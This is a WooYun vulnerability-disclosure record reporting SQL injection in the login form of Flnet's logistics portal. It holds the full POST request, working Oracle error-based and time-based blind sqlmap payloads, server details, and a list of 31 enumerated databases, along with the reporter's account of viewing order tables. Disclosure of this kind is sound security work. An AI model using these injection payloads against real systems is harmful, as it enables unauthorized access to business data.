{"id": 29811, "wybug_id": "wooyun-2015-0118215", "wybug_title": "富连网某站SQL注入（31个库 上千万的业务订单以及大量表泄露）", "wybug_corp": "富连网", "wybug_author": "天地不仁 以万物为刍狗", "wybug_date": "2015-06-04 15:22", "wybug_open_date": "2015-07-23 15:46", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-08：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-18：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-28：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-07-08：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向公众公开  简要描述： 【HD】 以团队之名 以个人之荣耀 共建网络安全------------------------------------------------------富连网是世界500强企业富士康集团旗下的3C数码网上购物平台，成立于2013年，总部位于中国广东深圳，主要为富士康从工，技，e贸转型的战略布局而铺垫，实现全球第一大代工厂富士康在终端零售的出海口，构建一个多品牌、多品类的3C数码线上shopping mall。未来富连网将依托富士康科技集团强大的制造能力、物流、售后及信息化支持，快速发展，致力打造成价实、货真、良品、承诺、服务的百分百可依赖的网上购物平台。 详细说明：  本次为POST 注入 注入点在 http://logistics.flnet.com/  电子商务 物流综合管理平台  由于参数 txtUsername 未过滤 所以导致了本次注入 下面为本次测试的详细内容\n\npost数据包：\nPOST /login.aspx HTTP/1.1Host: logistics.flnet.comUser-Agent: Mozilla/5.0 (Windows NT 6.1; rv:33.0) Gecko/20100101 Firefox/33.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3Accept-Encoding: gzip, deflateReferer: http://logistics.flnet.com/Cookie: ASP.NET_SessionId=02qfwhe3trklfp55132kfpevX-Forwarded-For: 8.8.8.8'Connection: keep-aliveContent-Type: application/x-www-form-urlencodedContent-Length: 199__EVENTTARGET=imgLogin&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUJMjI0MzMzNzI2D2QWAgIBD2QWAgIJDw8WAh4EVGV4dAUPMTIzLjE1MC4xNTkuMjI0ZGRkPfjP1YUiZjs2HB5dzzW9kzQcwFE%3D&txtUsername=admin&txtPassword=admin\n\n\n31个数据库\n\n为了走个大厂商流程  看了几个数据库的数量\n\n小白 对英文不是很懂  但是···我们有百度翻译\n\n上百万的业务数据····OMS 数据库也看了下 有八百多张表  WMS 两百多张表 其他数据库就没看了 （SHIPPING 航运   ORDER 订单  我英语不好  你们表骗我哦）\n\n\n\n其他的几个数据库就没看了  加起来 应该算是千万级别吧        漏洞证明：  \nPOST parameter 'txtUsername' is vulnerable. Do you want to keep testing the others (if any)? [y/N] nsqlmap identified the following injection points with a total of 294 HTTP(s) requests:---Parameter: txtUsername (POST)    Type: error-based    Title: Oracle AND error-based - WHERE or HAVING clause (XMLType)    Payload: __EVENTTARGET=imgLogin&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUJMjI0MzMzNzI2D2QWAgIBD2QWAgIJDw8WAh4EVGV4dAUPMTIzLjE1MC4xNTkuMjM1ZGRkz07cetA8Q4D9CW1pNuKII1WX6Qc=&txtUsername=admin' AND 5638=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(113)||CHR(107)||CHR(98)||CHR(113)||(SELECT (CASE WHEN (5638=5638) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(118)||CHR(107)||CHR(118)||CHR(113)||CHR(62))) FROM DUAL) AND 'sODr'='sODr&txtPassword=admin    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: __EVENTTARGET=imgLogin&__EVENTARGUMENT=&__VIEWSTATE=/wEPDwUJMjI0MzMzNzI2D2QWAgIBD2QWAgIJDw8WAh4EVGV4dAUPMTIzLjE1MC4xNTkuMjM1ZGRkz07cetA8Q4D9CW1pNuKII1WX6Qc=&txtUsername=admin' AND 4817=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5) AND 'bGkB'='bGkB&txtPassword=admin---[13:54:12] [INFO] the back-end DBMS is Oracleweb server operating system: Windows 2003 or XPweb application technology: ASP.NET, Microsoft IIS 6.0, ASP.NET 2.0.50727back-end DBMS: Oracle\n\navailable databases [31]:[*] B2B[*] CTXSYS[*] DBSNMP[*] DMSYS[*] EAI[*] EXFSYS[*] FB2B[*] FIN[*] LOGISTICS[*] LOGISTICS_TEST[*] MDSYS[*] MKT[*] OLAPSYS[*] OMS[*] OMS_TEST[*] ORDSYS[*] OUTLN[*] RMA[*] SCM[*] SMS[*] SYS[*] SYSTEM[*] TMS[*] TMS_TEST[*] TSMSYS[*] WMS[*] WMS_TEST[*] WMSYS[*] WTMS[*] WTMS_TEST[*] XDB\n   修复方案：  有礼物不？   版权声明：转载请注明来源 天地不仁 以万物为刍狗@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-06-08 15:44 厂商回复： 感谢提交漏洞，已交由相关单位处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}